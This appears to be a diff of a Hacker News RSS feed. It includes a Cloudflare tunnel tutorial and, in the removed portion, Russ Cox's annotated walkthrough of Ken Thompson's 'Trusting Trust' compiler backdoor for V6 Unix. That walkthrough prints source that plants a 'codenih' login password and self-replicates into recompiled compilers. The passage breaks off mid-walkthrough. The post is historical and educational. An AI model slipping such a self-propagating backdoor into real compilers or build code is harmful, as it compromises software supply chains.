             <link>https://jonathanclark.com/posts/coinbase-breach-timeline.html</link>
             <guid>45948058</guid>
             <pubDate>Sun, 16 Nov 2025 20:18:10 GMT</pubDate>
@@ -1563,7 +2174,7 @@ Return-Path: &lt;01000194436f122c-535a7ce0-f493-41c2-b966-dcaa1a9e6b57-000000@am
                 </article></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[62 chapter open-source Zig book (659 pts)]]></title>
+            <title><![CDATA[62 chapter open-source Zig book (672 pts)]]></title>
             <link>https://www.zigbook.net</link>
             <guid>45947810</guid>
             <pubDate>Sun, 16 Nov 2025 19:44:27 GMT</pubDate>
@@ -1571,7 +2182,7 @@ Return-Path: &lt;01000194436f122c-535a7ce0-f493-41c2-b966-dcaa1a9e6b57-000000@am
 <div id="readability-page-1" class="page"><div><div><div><p><img alt="Zig Logo" loading="lazy" width="240" height="240" decoding="async" data-nimg="1" src="https://www.zigbook.net/assets/zig-logo-light.svg"></p></div><div><h2>Learning Zig is not just about adding a language to your resume.</h2><p>It is about fundamentally changing how you think about software.</p></div><div><p>“You came for syntax.</p><p>You'll leave with a philosophy.”</p></div><p>61 chapters • Project-based • Zero AI • Written by @zigbook</p></div><div><div><div><p>zsh — zigbook.net</p></div><div><p>Welcome to Zigbook 🦎</p><p>Ready to transform how you think about software?</p><p>Exec: zig build zigbook</p><p><span>zigbook %</span><span>$ </span><span></span><span></span></p></div></div><div><p><span></span><span>Interactive terminal • Type to get started</span></p></div></div></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Tracking users with favicons, even in incognito mode (324 pts)]]></title>
+            <title><![CDATA[Tracking users with favicons, even in incognito mode (329 pts)]]></title>
             <link>https://github.com/jonasstrehle/supercookie</link>
             <guid>45947770</guid>
             <pubDate>Sun, 16 Nov 2025 19:39:52 GMT</pubDate>
@@ -1889,7 +2500,7 @@ More about this <a href="https://supercookie.me/workwise#content-scalability-per
 </article></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Dark Pattern Games (288 pts)]]></title>
+            <title><![CDATA[Dark Pattern Games (299 pts)]]></title>
             <link>https://www.darkpattern.games</link>
             <guid>45947761</guid>
             <pubDate>Sun, 16 Nov 2025 19:38:49 GMT</pubDate>
@@ -1903,7 +2514,7 @@ More about this <a href="https://supercookie.me/workwise#content-scalability-per
 	</div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[The fate of "small" open source (243 pts)]]></title>
+            <title><![CDATA[The fate of "small" open source (251 pts)]]></title>
             <link>https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/</link>
             <guid>45947639</guid>
             <pubDate>Sun, 16 Nov 2025 19:21:13 GMT</pubDate>
@@ -1950,7 +2561,7 @@ More about this <a href="https://supercookie.me/workwise#content-scalability-per
 							</div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[What if you don't need MCP at all? (206 pts)]]></title>
+            <title><![CDATA[What if you don't need MCP at all? (208 pts)]]></title>
             <link>https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/</link>
             <guid>45947444</guid>
             <pubDate>Sun, 16 Nov 2025 18:58:10 GMT</pubDate>
@@ -2416,7 +3027,7 @@ Interactive element picker. Click to select, Cmd/Ctrl+Click for multi-select, En
 </article></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Z3 API in Python: From Sudoku to N-Queens in Under 20 Lines (132 pts)]]></title>
+            <title><![CDATA[Z3 API in Python: From Sudoku to N-Queens in Under 20 Lines (135 pts)]]></title>
             <link>https://ericpony.github.io/z3py-tutorial/guide-examples.htm</link>
             <guid>45947301</guid>
             <pubDate>Sun, 16 Nov 2025 18:38:37 GMT</pubDate>
@@ -3511,7 +4122,7 @@ You may also initialize Z3Py manually using the command:
 </div>]]></description>
         </item>
         <item>
-            <title><![CDATA[I finally understand Cloudflare Zero Trust tunnels (242 pts)]]></title>
+            <title><![CDATA[I finally understand Cloudflare Zero Trust tunnels (250 pts)]]></title>
             <link>https://david.coffee/cloudflare-zero-trust-tunnels</link>
             <guid>45946865</guid>
             <pubDate>Sun, 16 Nov 2025 17:39:43 GMT</pubDate>
@@ -3539,7 +4150,7 @@ ingress:
 </code></pre><p>Then go into Cloudflare DNS settings and map the domain <code>homeassistant.mydomain.com</code> to the tunnel:</p><p><code>CNAME homeassistant.mydomain.com a2f17e27-cd4d-4fcd-b02a-63839f57a96f.cfargotunnel.com</code></p><p>Now all traffic going to this domain will go through the cloudflared tunnel, which is configured to route <code>homeassistant.mydomain.com</code> to <code>192.168.1.3</code>. <strong>No Warp client needed</strong>, Argo tunnel does everything for us.</p><p><strong>Note:</strong> If you adopted the tunnels and don’t use <code>config.yaml</code>, you can automatically create matching DNS records in the Cloudflare UI and don’t need to do this manually.</p><h3 id="routes">Routes</h3><p>A route defines <em>where</em> to direct traffic to.</p><p>Let’s say your homeassistant runs on 192.168.1.3 at home and you want to reach it from outside. Just above we deployed a <code>cloudflared</code> tunnel on our router at 192.168.1.3, and added a config pointing the domain to the Argo tunnel, so <code>homeassistant.mydomain.com</code> is already available to the public. However, <code>192.168.1.3</code> isn’t, as it’s a private network IP.</p><p><img src="https://david.coffee/routes-configure.png" alt="Configuring a route in Zero Trust"></p><p>You can define:</p><ul><li>A route like <code>192.168.1.1/24</code> pointing at your tunnel, to route <em>ALL</em> traffic to the full IP range through that tunnel (so even 192.168.1.245 will go through your tunnel)</li><li>Or a more specific route like <code>192.168.1.3/32</code> pointing at your tunnel, to <em>ONLY</em> route traffic to 192.168.1.3 through that tunnel.</li></ul><p>When configured, once your user connects their Warp client that’s set up with your Zero Trust network, the Warp client will see requests to 192.168.1.3 and route it through the Cloudflare network to reach your specific tunnel. Like a little police helper directing cars where to go.</p><p><em>If the Warp client is <strong>not</strong> connected, 192.168.1.3 will just resolve in your current local network. If connected, it will resolve to the tunnel.</em></p><p><strong>The routed IP doesn’t need to exist!</strong> So you could, for example, route a random IP you like (e.g., 10.128.1.1) to your tunnel, the tunnel then forwards it based on your routes, for example to 192.168.1.1. This is extremely powerful because it allows you to build your own fully virtual network.</p><p>That’s all it does, what happens afterwards is up to the tunnel config that we created above. The tunnel decides where to point the incoming request to, whether that’s localhost or somewhere else.</p><p>To summarize, the <code>route</code> tells the Warp client where to route traffic to.</p><p>Now we have 2 things working:</p><ul><li><code>homeassistant.mydomain.com</code> - goes through a Cloudflare DNS record pointing at an Argo tunnel, which then forwards to 192.168.1.3. This works without Warp connected as it’s on the DNS level, public to everyone.</li><li><code>192.168.1.3</code> - The Warp client sees the request and routes it through the Argo tunnel, which then forwards it to <code>192.168.1.3</code> within that network. This needs Warp connected to work, and is only visible to people in your Zero Trust org.</li></ul><h3 id="targets">Targets</h3><p>This one took me a while.</p><p>Targets are needed to <em>define a piece of infrastructure</em> that you want to protect through Zero Trust. They are like a pointer pointing to something in your network. This goes hand-in-hand with routes, but isn’t always needed.</p><p>Let’s say you have 192.168.1.3 (homeassistant) exposed through a Cloudflare tunnel. By default, anyone in your network that is part of your Zero Trust org and has Warp client installed can now access your homeassistant at 192.168.1.3.</p><p>We can change that with targets. For example, defining a target with hostname = <code>homeassistant.mydomain.com</code> to the route <code>192.168.1.3/32</code> allows us to add access policies to it. We can also put an entire network into the target by specifying <code>192.168.1.3/24</code> to control access. This also works with virtual IPs like 10.128.1.1!</p><p><img src="https://david.coffee/targets-config-screen.png" alt="Configuring a target in Zero Trust"></p><p>Targets alone won’t do anything, they just point to the service or network. “Hey, here is homeassistant”, or “hey, here is my home network”.</p><h2 id="access-policies-protecting-who-can-access-what">Access Policies: Protecting Who Can Access What</h2><p>Continuing the example from above:</p><ul><li>we have a tunnel running on our home network that routes <code>homeassistant.mydomain.com</code> to <code>192.168.1.3</code></li><li>we set up public DNS records to point <code>homeassistant.mydomain.com</code> to the Argo tunnel in Cloudflare</li><li>we created a <em>route</em> <code>192.168.1.3</code> to go through the same tunnel</li><li>we also created a <em>target</em> pointing to <code>192.168.1.3</code></li></ul><p>When users access either <code>192.168.1.3</code> or <code>homeassistant.mydomain.com</code>, the Warp client will route the request through the tunnel, which then forwards the request to 192.168.1.3. Homeassistant loads and everything is fine.</p><p><em>But do we want that?</em></p><p>Probably not.</p><p>Access policies to the rescue!</p><p>With access policies, we can leave things in the public but protect them with Cloudflare Zero Trust access. So while 192.168.1.3 is only available if Warp is connected (so routing to it works), we can add security to our public <code>homeassistant.mydomain.com</code>.</p><p>Go to Access -&gt; Applications -&gt; Add an Application -&gt; Self-hosted.</p><p>Here we can define <em>what</em> should be protected, and <em>how</em>.</p><p>Going with our previous example, we can add a public hostname <code>homeassistant.mydomain.com</code> or an IP like <code>192.168.1.3</code> (or both), then attach policies of who should be able to access it.</p><p>You can specify <strong>Include</strong> (“OR”) and <strong>Require</strong> (“AND”) selectors.</p><ul><li><strong>Require</strong> rules must always be met, <em>on top</em> of include rules, to grant access</li><li>Any of the <strong>Include</strong> rules must match to grant access</li></ul><p>Then there are <em>Actions</em>:</p><ul><li><strong>Allow</strong> - when the policy matches, allow access</li><li><strong>Deny</strong> - when the policy matches, deny access. aka blocking something.</li><li><strong>Bypass</strong> - when the policy matches, bypass Zero Trust completely. No more checking.</li><li><strong>Service Auth</strong> - when the policy matches, allow authentication to the service with a service token header (good for server-to-server, or bots). Check Access -&gt; Service Auth to create these tokens.</li></ul><h3 id="allow-public-access-to-everyone-logging-into-your-network">Allow public access to everyone logging into your network</h3><p>The most common use case: <code>homeassistant.mydomain.com</code> is public. We want to keep it public, but add an extra layer of security.</p><p>Add an <em>include</em> policy, pick any of the <code>email</code> selectors, add the email of the user you want to allow access to. Now only people authenticated with your Zero Trust org with the specified emails can access your homeassistant, without needing to have Warp running.</p><p>We can harden this by adding <em>require</em> rules: Add a <em>Login Method</em> selector rule, pick a specific login method like GitHub. Now only people with specific emails that have authenticated through GitHub can access your homeassistant, without needing to have Warp running.</p><p><img src="https://david.coffee/policy-github-emails.png" alt="Configuring an Access Policy with GitHub and email"></p><h3 id="bypass-login-completely-when-connected-through-warp">Bypass login completely when connected through WARP</h3><p>Another policy I like having is to skip the login screen entirely when connected through Warp. If a user is already enrolled into my Zero Trust org and has the Warp client provisioned, then there’s no need to ask them to authenticate again.</p><p>We can add a separate policy (don’t edit the one we just created above), pick the <em>Gateway</em> selector and set it to <em>Allow</em> or <em>Bypass</em>.</p><p><img src="https://david.coffee/policy-gateway-auth.png" alt="Policy to allow Gateway auth"></p><p><strong>Don’t use ‘Warp’</strong> - the Warp selector will match anyone that has Warp running, including the consumer 1.1.1.1 app. <em>Gateway</em>, on the other hand, matches only if someone is connecting through your Gateway, be that DNS or a provisioned Warp client.</p><p><em>(The ‘Gateway’ selector is only available if the Warp client is set to allow WARP authentication identity)</em></p><p>Now when:</p><ul><li>Warp through Zero Trust is running on a machine: No login screen</li><li>No Warp running (public access): Prompt for login screen, but only allow specific emails that authenticated through GitHub</li></ul><p>This setup makes it very convenient to reach homeassistant, no matter if connected through Warp or not.</p><h2 id="deploying-the-warp-client-and-enrolling-into-zero-trust">Deploying the Warp client and enrolling into Zero Trust</h2><p>Are you still with me?</p><p>Our network is basically done. We have a login-protected <code>homeassistant.mydomain.com</code> that routes through our tunnel into our private network and terminates at <code>192.168.1.3</code>, and we have a direct route to <code>192.168.1.3</code> that only works when connected with Warp.</p><p>We also have login policies to make sure only specific users (logged in with GitHub and certain email addresses) can access homeassistant.</p><p><em>So how do we deploy the dang Warp client?</em></p><p>Actually the same: We create some policies.</p><p><strong>Head to Settings -&gt; Warp Client</strong></p><p>In <strong>Enrollment Permissions</strong>, we specify the same policies for who can enroll. For example, “<a href="https://david.coffee/cdn-cgi/l/email-protection" data-cfemail="197f7676377b786b597d7674787077377a7674">[email&nbsp;protected]</a>” when authenticated through GitHub is allowed to enroll. In the <em>Login Methods</em> we can specify what login methods are available when someone tries to enroll into our Zero Trust org.</p><p><img src="https://david.coffee/enrollment-policy-login-methods.png" alt="Login methods enroll policies"></p><p>Toggle <em>WARP authentication identity settings</em> to make the <em>Gateway</em> selector available in policies, effectively allowing the configured WARP client to be used as a login method.</p><p><strong>Careful here</strong>, once someone is enrolled, they are basically in your Zero Trust network through Warp. Make sure you harden this.</p><p>Then, in <strong>Profile settings</strong>, we define <em>how the WARP client behaves</em>. These are things like protocol: MASQUE or WireGuard, service mode, what IPs and domains to exclude from WARP routing (e.g., the local network should never go through WARP), setting it to exclude or include mode and so on.</p><p>Other settings I recommend setting:</p><ul><li><em>Install CA to system certificate store</em> - installs the Cloudflare CA certificate automatically when enrolled.</li><li><em>Override local interface IP</em> - assigns a unique CGNAT private IP to the client. This is needed for warp-to-warp routing.</li><li><em>Device Posture</em> - what checks the WARP client should perform for the org. E.g., check the OS version, some OS files on disk, etc. I have this set to <em>WARP</em> and <em>Gateway</em> because I want the client to provide information on whether the user is connected through WARP and Gateway, for skipping certain login pages.</li></ul><p><img src="https://david.coffee/device-posture-checks.png" alt="Device posture checks for Gateway and Warp"></p><p>Once done, just open the Warp client (<a href="https://developers.cloudflare.com/warp-client/)">https://developers.cloudflare.com/warp-client/)</a>, and log in to your network. This should open the login pages you specified in the <em>Device Enrollment</em> screen, and check all the enrollment policies you specified.</p><p>Once passed, congratulations, your WARP client is now connected to your Zero Trust network. The client will then go ahead and start routing <code>192.168.1.3</code> through your tunnels, as specified in your tunnel and route settings.</p><p>🎉</p><h2 id="what-we-built">What we built</h2><p>If you followed this guide, here is what we built:</p><ul><li>Login methods to connect the Warp client to your Zero Trust org through GitHub and specific email addresses</li><li>A <em>tunnel</em> within your private network that<ul><li>Forwards any request coming in with host <code>homeassistant.mydomain.com</code> to <code>192.168.1.3</code></li></ul></li><li>A <em>route</em> that forwards all traffic for <code>192.168.1.3</code> to the tunnel in your private network, which will terminate it at 192.168.1.3, which will only work when connected through Warp to route the request</li><li>A DNS name <code>homeassistant.mydomain.com</code> that points to the Argo tunnel, and will allow everyone (even if not connected through Warp) to access homeassistant which runs at 192.168.1.3</li><li>Access policies that will<ul><li>Ask users that are not connected to Zero Trust through Warp to log in with GitHub and specific email, so everyone can access it if they can log in</li><li>A policy that skips the login screen completely and just shows homeassistant if the user connects through Zero Trust Warp client (enrolled into our org)</li></ul></li></ul><p>You don’t need the public domain and you don’t need the route to 192.168.1.3. These are 2 different options that you can use to expose homeassistant when you’re not at home. One is using a public domain name everyone can see, one is explicitly requiring connecting through enrolled Warp.</p><p>What I <em>didn’t</em> cover in this post:</p><ul><li>Warp-to-warp routing</li><li>Creating and assigning fully private IPs that only exist within your Zero Trust network</li><li>SSH authentication through Zero Trust access policies (that’s what we need <em>Targets</em> for)</li><li>The other application types besides <em>Self-Hosted</em></li></ul><p>I’m happy to expand on it if there’s interest. Let me know on <a href="https://x.com/dvcrn">X</a> or <a href="https://bsky.app/profile/david.d.sh">Bluesky</a>.</p><p>Happy tunneling! ⛅</p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Three kinds of AI products work (124 pts)]]></title>
+            <title><![CDATA[Three kinds of AI products work (126 pts)]]></title>
             <link>https://www.seangoedecke.com/ai-products/</link>
             <guid>45946498</guid>
             <pubDate>Sun, 16 Nov 2025 16:56:47 GMT</pubDate>
@@ -3933,1242 +4544,6 @@ along with this program.  If not, see <a href="https://www.gnu.org/licenses/" re
 <p dir="auto"><strong>By contributing to this project, you agree to release your
 contributions under the same license.</strong></p>
 </article></div></div>]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Running the "Reflections on Trusting Trust" Compiler (2023) (117 pts)]]></title>
-            <link>https://research.swtch.com/nih</link>
-            <guid>45945202</guid>
-            <pubDate>Sun, 16 Nov 2025 13:59:19 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://research.swtch.com/nih">https://research.swtch.com/nih</a>, See on <a href="https://news.ycombinator.com/item?id=45945202">Hacker News</a></p>
-<div id="readability-page-1" class="page"><div>
-        <h2>Running the “Reflections on Trusting Trust” Compiler
-
-        <div>
-        <p>
-
-            Posted on Wednesday, October 25, 2023.
-
-
-        </p>
-        </div>
-        </h2>
-       
-
-
-<p>
-Supply chain security is a hot topic today, but it is a very old problem.
-In October 1983, 40 years ago this week,
-Ken Thompson chose supply chain security as the topic for his Turing award lecture,
-although the specific term wasn’t used back then.
-(The field of computer science was still young and small enough that the ACM conference where Ken spoke was
-the “Annual Conference on Computers.”)
-Ken’s lecture was later published in <i>Communications of the ACM</i>
-under the title “<a href="https://dl.acm.org/doi/pdf/10.1145/358198.358210">Reflections on Trusting Trust</a>.”
-It is a classic paper, and a short one (3 pages);
-if you haven’t read it yet, you should. This post will still be here when you get back.
-</p>
-
-<p>
-In the lecture, Ken explains in three steps how to modify a C compiler binary
-to insert a backdoor when compiling the “login” program,
-leaving no trace in the source code.
-In this post, we will run the backdoored compiler using Ken’s actual code.
-But first, a brief summary of the important parts of the lecture.
-</p>
-
-<a href="#step1"><h2 id="step1">Step 1: Write a Self-Reproducing Program</h2></a>
-
-<p>
-Step 1 is to write a program that prints its own source code.
-Although the technique was not widely known in 1975,
-such a program is now known in computing as a “<a href="https://en.wikipedia.org/wiki/Quine_(computing)">quine</a>,”
-popularized by Douglas Hofstadter in <i>Gödel, Escher, Bach</i>.
-Here is a Python quine, from <a href="https://cs.lmu.edu/~ray/notes/quineprograms/">this collection</a>:
-</p>
-
-<pre>s=<span>’s=%r;print(s%%s)’</span>;print(s%s)
-</pre>
-
-<p>
-And here is a slightly less cryptic Go quine:
-</p>
-
-<pre>package main
-func main() { print(q + "\x60" + q + "\x60") }
-var q = <span>`package main
-func main() { print(q + "\x60" + q + "\x60") }
-var q = `</span>
-</pre>
-
-<p>The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder.
-In the Python version, the placeholder is <code>%r</code>;
-in the Go version, the placeholder is implicit at the end of the string.
-For more examples and explanation, see my post “<a href="https://research.swtch.com/zip">Zip Files All The Way Down</a>,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.
-</p>
-
-<a href="#step2"><h2 id="step2">Step 2: Compilers Learn</h2></a>
-
-<p>
-Step 2 is to notice that when a compiler compiles itself,
-there can be important details that persist only in the compiler
-binary, not in the actual source code.
-Ken gives the example of the numeric values of escape sequences in C strings.
-You can imagine a compiler containing code like this during
-the processing of escaped string literals:
-</p>
-
-<pre>c = next();
-if(c == '\\') {
-    c = next();
-    if(c == 'n')
-        c = '\n';
-}
-</pre>
-
-<p>
-That code is responsible for processing the two character sequence <code>\n</code>
-in a string literal
-and turning it into a corresponding byte value,
-specifically <code>’\n’</code>.
-But that’s a circular definition, and the first time you write code like that it won’t compile.
-So instead you write <code>c = 10</code>,
-you compile and install the compiler, and <i>then</i> you can change
-the code to <code>c = ’\n’</code>.
-The compiler has “learned” the value of <code>’\n’</code>,
-but that value only appears in the compiler binary,
-not in the source code.
-</p>
-
-<a href="#step3"><h2 id="step3">Step 3: Learn a Backdoor</h2></a>
-
-<p>
-Step 3 is to put these together to help the compiler “learn”
-to miscompile the target program (<code>login</code> in the lecture).
-It is fairly straightforward to write code in a compiler
-to recognize a particular input program and modify its code,
-but that code would be easy to find if the compiler source were inspected.
-Instead, we can go deeper, making two changes to the compiler:
-</p>
-
-<ol>
-<li>Recognize <code>login</code> and insert the backdoor.
-</li><li>Recognize the compiler itself and insert the code for these two changes.
-</li></ol>
-
-<p>
-The “insert the code for these two changes” step requires being able to write
-a self-reproducing program: the code must reproduce itself
-into the new compiler binary.
-At this point, the compiler binary has “learned” the miscompilation steps,
-and the clean source code can be restored.
-</p>
-
-<a href="#run"><h2 id="run">Running the Code</h2></a>
-
-<p>At the Southern California Linux Expo in March 2023,
-Ken gave the closing keynote,
-<a href="https://www.youtube.com/live/kaandEt_pKw?si=RGKrC8c0B9_AdQ9I&amp;t=643">a delightful talk</a>
-about his 75-year effort accumulating what must be the world’s
-largest privately held digital music collection,
-complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins).
-During the Q&amp;A session, someone <a href="https://www.youtube.com/live/kaandEt_pKw?si=koOlE35Q3mjqH4yf&amp;t=3284">jokingly asked</a> about the Turing award lecture, specifically
-“can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?”
-Ken replied:
-</p>
-
-<blockquote>
-I assume you’re talking about some paper I wrote a long time ago.
-No, I have no backdoor.
-That was very carefully controlled, because there were some spectacular fumbles before that.
-I got it released, or I got somebody to steal it from me, in a very controlled sense,
-and then tracked whether they found it or not.
-And they didn’t.
-But they broke it, because of some technical effect,
-but they didn’t find out what it was and then track it.
-So it never got out, if that’s what you’re talking about.
-I hate to say this in front of a big audience, but
-the one question I’ve been waiting for since I wrote that paper is
-“you got the code?”
-Never been asked.
-I still have the code.
-</blockquote>
-
-<p>Who could resist that invitation!?
-Immediately after watching the video on YouTube in September 2023,
-I emailed Ken and asked him for the code.
-Despite my being six months late, he said I was the first person to ask
-and mailed back an attachment called <code>nih.a</code>,
-a cryptic name for a cryptic program.
-(Ken tells me it does in fact stand for “not invented here.”)
-Normally today, <code>.a</code> files are archives containing
-compiler object files,
-but this one contains two source files.</p>
-
-<p>
-The code applies cleanly to the C compiler from the
-<a href="https://en.wikipedia.org/wiki/Research_Unix">Research Unix Sixth Edition (V6)</a>.
-I’ve posted an online emulator that runs V6 Unix programs
-and populated it with some old files from Ken and Dennis,
-including <code>nih.a</code>.
-Let’s actually run the code.
-You can <a href="https://research.swtch.com/v6">follow along in the simulator</a>.</p>
-
-
-<table>
-<tbody><tr>
-<td>
-<p>Login as <code>ken</code>, password <code>ken</code>.<br>
-(The password is normally not shown.)
-</p></td><td><pre>login: <b>ken</b>
-Password: <b>ken</b>
-
-% <b>who</b>
-ken     tty8 Aug 14 22:06
-%
-</pre>
-</td></tr><tr>
-<td>
-<p>Change to and list the <code>nih</code> directory,<br>
-discovering a Unix archive.
-</p></td><td><pre>% <b>chdir nih</b>
-% <b>ls</b>
-nih.a
-</pre>
-</td></tr><tr>
-<td>
-<p>Extract <code>nih.a</code>.
-</p></td><td><pre>% <b>ar xv nih.a</b>
-x x.c
-x rc
-</pre>
-</td></tr><tr>
-<td>
-<p>Let’s read <code>x.c</code>, a C program.
-</p></td><td><pre>% <b>cat x.c</b>
-</pre>
-</td></tr><tr>
-<td>
-<p>Declare the global variable <code>nihflg</code>,<br>
-of implied type <code>int</code>.
-</p></td><td><pre>nihflg;
-</pre>
-</td></tr><tr>
-<td>
-<p>
-Define the function <code>codenih</code>, with implied<br>
-return type <code>int</code> and no arguments.<br>
-The compiler will be modified to call <code>codenih</code><br>
-during preprocessing, for each input line.
-</p></td><td><pre>codenih()
-{
-    char *p,*s;
-    int i;
-</pre>
-</td></tr><tr>
-<td>
-<p><code>cc -p</code> prints the preprocessor output<br>
-instead of invoking the compiler back end.<br>
-To avoid discovery, do nothing when <code>-p</code> is used.<br>
-The implied return type of <code>codenih</code> is <code>int</code>,<br>
-but early C allowed omitting the return value.
-</p></td><td><pre>    if(pflag)
-        return;
-</pre>
-</td></tr><tr>
-<td>
-<p>Skip leading tabs in the line.
-</p></td><td><pre>    p=line;
-    while(*p=='\t')
-        p++;
-</pre>
-</td></tr><tr>
-<td>
-<p>Look for the line<br>
-“<code>name = crypt(pwbuf);</code>” from <a href="https://research.swtch.com/login.c#crypt"><code>login.c</code></a>.<br>
-If not found, jump to <code>l1</code>.
-</p></td><td><pre>    s="namep = crypt(pwbuf);";
-    for(i=0;i&lt;21;i++)
-        if(s[i]!=p[i])
-            goto l1;
-</pre>
-</td></tr><tr>
-<td>
-<p>Define <code>login</code> backdoor code <code>s</code>, which does:<br>
-Check for the password “<code>codenih</code>”.<br>
-If found, modify <code>namep</code> and <code>np</code><br>
-so that the code that follows in <br>
-<a href="https://research.swtch.com/login.c#crypt"><code>login.c</code></a> will accept the password.
-</p></td><td><pre>    p=+i;
-    s="for(c=0;c&lt;8;c++)"
-      "if(\"codenih\"[c]!=pwbuf[c])goto x1x;"
-      "while(*namep)namep++;"
-      "while(*np!=':')np++;x1x:";
-</pre>
-</td></tr><tr>
-<td>
-<p>With the <code>p=+i</code> from above,<br>
-this is: <code>strcpy(p+i, s); return;</code>,<br>
-appending the backdoor to the line.<br>
-In early C, <code>+=</code> was spelled <code>=+</code>.<br>
-The loop is <code>strcpy</code>, and <code>goto l4</code><br>
-jumps to the end of the function.
-</p></td><td><pre>    for(i=0;;i++)
-        if(!(*p++=s[i]))
-            break;
-    goto l4;
-</pre>
-</td></tr><tr>
-<td>
-<p>No match for <code>login</code> code. Next target:<br>
-the distinctive line “<code>av[4] = "-P";</code>”<br>
-from <a href="https://research.swtch.com/cc.c#av4">cc.c</a>. If not found, jump to <code>l2</code>.
-</p></td><td><pre>l1:
-    s="av[4] = \"-P\";";
-    for(i=0;i&lt;13;i++)
-        if(s[i]!=p[i])
-            goto l2;
-</pre>
-</td></tr><tr>
-<td>
-<p>Increment <code>nihflg</code> to 1 to remember<br>
-evidence of being in <code>cc.c</code>, and return.
-</p></td><td><pre>    nihflg++;
-    goto l4;
-</pre>
-</td></tr><tr>
-<td>
-<p>
-Next target: <a href="https://research.swtch.com/cc.c#getline">input reading loop in <code>cc.c</code></a>,<br>
-but only if we’ve seen the <code>av[4]</code> line too:<br>
-the text “<code>while(getline()) {</code>”<br>
-is too generic and may be in other programs.<br>
-If not found, jump to <code>l3</code>.
-</p></td><td><pre>l2:
-    if(nihflg!=1)
-        goto l3;
-    s="while(getline()) {";
-    for(i=0;i&lt;18;i++)
-        if(s[i]!=p[i])
-            goto l3;
-</pre>
-</td></tr><tr>
-<td>
-<p>
-Append input-reading backdoor: call <code>codenih</code><br>
-(this very code!) after reading each line.<br>
-Increment <code>nihflg</code> to 2 to move to next state.
-</p></td><td><pre>    p=+i;
-    s="codenih();";
-    for(i=0;;i++)
-        if(!(*p++=s[i]))
-            break;
-    nihflg++;
-    goto l4;
-</pre>
-</td></tr><tr>
-<td>
-<p>Next target: <a href="https://research.swtch.com/cc.c#fflush">flushing output in <code>cc.c</code></a>.
-</p></td><td><pre>l3:
-    if(nihflg!=2)
-        goto l4;
-    s="fflush(obuf);";
-    for(i=0;i&lt;13;i++)
-        if(s[i]!=p[i])
-            goto l4;
-</pre>
-</td></tr><tr>
-<td>
-<p>Insert end-of-file backdoor: call <code>repronih</code><br>
-to reproduce this very source file<br>
-(the definitions of <code>codenih</code> and <code>repronih</code>)<br>
-at the end of the now-backdoored text of <code>cc.c</code>.
-</p></td><td><pre>    p=+i;
-    s="repronih();";
-    for(i=0;;i++)
-        if(!(*p++=s[i]))
-            break;
-    nihflg++;
-l4:;
-}
-</pre>
-</td></tr><tr>
-<td>
-<p>Here the magic begins, as presented in the<br>
-Turing lecture. The <code>%0</code> is not valid C.<br>
-Instead, the script <code>rc</code> will replace the <code>%</code><br>
-with byte values for the text of this exact file,<br>
-to be used by <code>repronih</code>.
-</p></td><td><pre>char nihstr[]
-{
-%0
-};
-</pre>
-</td></tr><tr>
-<td>
-<p>The magic continues.<br>
-</p></td><td><pre>repronih()
-{
-    int i,n,c;
-</pre>
-</td></tr><tr>
-<td>
-<p>If <code>nihflg</code> is not 3, this is not <code>cc.c</code><br>
-so don’t do anything.
-</p></td><td><pre>    if(nihflg!=3)
-        return;
-</pre>
-</td></tr><tr>
-<td>
-<p>The most cryptic part of the whole program.<br>
-Scan over <code>nihstr</code> (indexed by <code>i</code>)<br>
-in five phases according to the value <code>n</code>:
-</p><p><code>n=0</code>: emit literal text before “<code>%</code>”<br>
-<code>n=1</code>: emit octal bytes of text before “<code>%</code>”<br>
-<code>n=2</code>: emit octal bytes of “<code>%</code>” and rest of file<br>
-<code>n=3</code>: no output, looking for “<code>%</code>”<br>
-<code>n=4</code>: emit literal text after “<code>%</code>”<br>
-</p>
-</td><td><pre>    n=0;
-    i=0;
-    for(;;)
-    switch(c=nihstr[i++]){
-</pre>
-</td></tr><tr>
-<td>
-<p><code>045</code> is <code>'%'</code>, kept from appearing<br>
-except in the magic location inside <code>nihstr</code>.<br>
-Seeing <code>%</code> increments the phase.<br>
-The phase transition 0 → 1 rewinds the input.<br>
-Only phase 2 keeps processing the <code>%.</code>
-</p></td><td><pre>    case 045:
-        n++;
-        if(n==1)
-            i=0;
-        if(n!=2)
-            continue;
-</pre>
-</td></tr><tr>
-<td>
-<p>In phases 1 and 2, emit octal byte value<br>
-(like <code>0123,</code>) to appear inside <code>nihstr</code>.<br>
-Note the comma to separate array elements,<br>
-so the <code>0</code> in <code>nihstr</code>’s <code>%0</code> above is a final,<br>
-terminating NUL byte for the array.
-</p></td><td><pre>    default:
-        if(n==1||n==2){
-            putc('0',obuf);
-            if(c&gt;=0100)
-                putc((c&gt;&gt;6)+'0',obuf);
-            if(c&gt;=010)
-                putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
-            putc((c&amp;7)+'0',obuf);
-            putc(',',obuf);
-            putc('\n',obuf);
-            continue;
-        }
-</pre>
-</td></tr><tr>
-<td>
-<p>In phases 0 and 4, emit literal byte value,<br>
-to reproduce source file around the <code>%</code>.<br>
-</p></td><td><pre>        if(n!=3)
-            putc(c,obuf);
-        continue;
-</pre>
-</td></tr><tr>
-<td>
-<p>Reaching end of <code>nihstr</code> increments the phase<br>
-and rewinds the input.<br>
-The phase transition 4 → 5 ends the function.
-</p></td><td><pre>    case 0:
-        n++;
-        i=0;
-        if(n==5){
-            fflush(obuf);
-            return;
-        }
-    }
-}
-</pre>
-</td></tr><tr>
-<td>
-<p>Now let’s read <code>rc</code>, a shell script.
-</p></td><td><pre>% <b>cat rc</b>
-</pre>
-</td></tr><tr>
-<td>
-<p>Start the editor <code>ed</code> on <code>x.c</code>.<br>
-The V6 shell <code>sh</code> opened<br>
-input scripts on standard input,<br>
-sharing it with invoked commands,<br>
